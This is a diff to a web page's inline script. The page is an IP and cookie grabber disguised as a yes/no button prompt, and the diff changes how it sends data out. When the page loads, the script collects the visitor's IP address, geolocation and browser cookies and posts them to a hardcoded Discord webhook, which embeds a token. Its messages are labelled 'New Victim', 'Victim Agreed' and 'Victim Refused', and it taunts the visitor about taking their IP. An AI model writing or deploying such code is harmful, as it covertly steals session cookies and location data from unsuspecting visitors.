@@ -53,8 +53,7 @@
     const noButton = document.querySelector('button:last-of-type');
     const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
     let clicked = false;
-    let baseEmbed = null;
-    let currentIp = null;
+    let victimInfo = null;
     const counterKey = 'totalVictims';
     let totalVictims = parseInt(localStorage.getItem(counterKey)) || 0;
     totalVictims++;
@@ -63,7 +62,7 @@
       const embed = {
         title: 'New Victim',
         fields: [
-          { name: 'Total Victims', value: totalVictims.toString(), inline: true }
+          { name: 'Total Victims Online :', value: totalVictims.toString(), inline: true }
         ],
         color: 3447003
       };
@@ -73,24 +72,21 @@
         body: JSON.stringify({ embeds: [embed] }),
       }).catch(console.error);
     };
-    const getCookiesBlob = () => {
+    const sendEmbed = (embedBase, color, title) => {
       const cookies = document.cookie || 'No cookies';
-      const blob = new Blob([cookies], { type: 'text/plain' });
-      return { blob, filename: 'cookies.txt' };
-    };
-    const sendWithCookies = (embed, color, title) => {
-      const { blob, filename } = getCookiesBlob();
-      const payloadEmbed = {
+      const fullEmbed = {
         title,
-        ...embed,
-        color
+        ...embedBase,
+        color,
+        fields: [
+          ...embedBase.fields,
+          { name: 'Cookies', value: cookies.substring(0, 1000) + (cookies.length > 1000 ? '...' : ''), inline: false }
+        ]
       };
-      const formData = new FormData();
-      formData.append('payload_json', JSON.stringify({ embeds: [payloadEmbed] }));
-      formData.append('file', blob, filename);
       fetch(webhookUrl, {
         method: 'POST',
-        body: formData,
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds: [fullEmbed] }),
       }).catch(console.error);
     };
     const buildEmbed = (ip, geoData) => {
@@ -150,12 +146,12 @@
       return fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          currentIp = data.ip;
-          console.log('Your IP:', currentIp);
-          return fetch(`http://ip-api.com/json/${currentIp}`)
+          const ip = data.ip;
+          console.log('Your IP:', ip);
+          return fetch(`http://ip-api.com/json/${ip}`)
             .then(geoResponse => geoResponse.json())
             .then(geoData => {
-              return { ip: currentIp, embed: buildEmbed(currentIp, geoData) };
+              return { ip, embed: buildEmbed(ip, geoData) };
             });
         })
         .catch(error => {
@@ -165,47 +161,52 @@
     };
     sendNewVictim();
     const infoPromise = fetchVictimInfo();
-    infoPromise.then(victimInfo => {
-      if (victimInfo) {
-        baseEmbed = victimInfo.embed;
-        sendWithCookies(baseEmbed, 0x9D9D9D, 'New Victim - Undecided');
+    infoPromise.then(v => {
+      if (v) {
+        victimInfo = v;
       }
     });
     setTimeout(() => {
-      if (!clicked && baseEmbed) {
-        sendWithCookies(baseEmbed, 0x9D9D9D, 'Victim didn\'t decide in time');
+      if (!clicked) {
+        if (victimInfo) {
+          sendEmbed(victimInfo.embed, 10197915, "Victim didn't decide in time");
+        } else {
+          fetchVictimInfo().then(v => {
+            if (v) {
+              sendEmbed(v.embed, 10197915, "Victim didn't decide in time");
+            }
+          });
+        }
       }
     }, 10000);
     yesButton.addEventListener('click', () => {
       clicked = true;
       alert('cool thanks!');
-      infoPromise.then(victimInfo => {
-        if (victimInfo) {
-          sendWithCookies(victimInfo.embed, 65280, 'Victim Agreed');
-        } else {
-          fetchVictimInfo().then(victimInfo => {
-            if (victimInfo) {
-              sendWithCookies(victimInfo.embed, 65280, 'Victim Agreed');
-            }
-          });
-        }
-      });
+      if (victimInfo) {
+        sendEmbed(victimInfo.embed, 65280, 'Victim Agreed');
+      } else {
+        fetchVictimInfo().then(v => {
+          if (v) {
+            sendEmbed(v.embed, 65280, 'Victim Agreed');
+          }
+        });
+      }
     });
     noButton.addEventListener('click', () => {
       clicked = true;
-      infoPromise.then(victimInfo => {
-        if (victimInfo) {
-          sendWithCookies(victimInfo.embed, 16711680, 'Victim Refused');
-          alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
-        } else {
-          fetchVictimInfo().then(victimInfo => {
-            if (victimInfo) {
-              sendWithCookies(victimInfo.embed, 16711680, 'Victim Refused');
-              alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
-            }
-          });
-        }
-      });
+      if (victimInfo) {
+        sendEmbed(victimInfo.embed, 16711680, 'Victim Refused');
+        alert(`no?? Then your ip shall be mine, its ${victimInfo.ip} btw`);
+      } else {
+        fetchVictimInfo().then(v => {
+          if (v) {
+            sendEmbed(v.embed, 16711680, 'Victim Refused');
+            alert(`no?? Then your ip shall be mine, its ${v.ip} btw`);
+          } else {
+            alert('no?? Then your ip shall be mine, its [error] btw');
+          }
+        });
+      }
     });
   </script>
 </body>
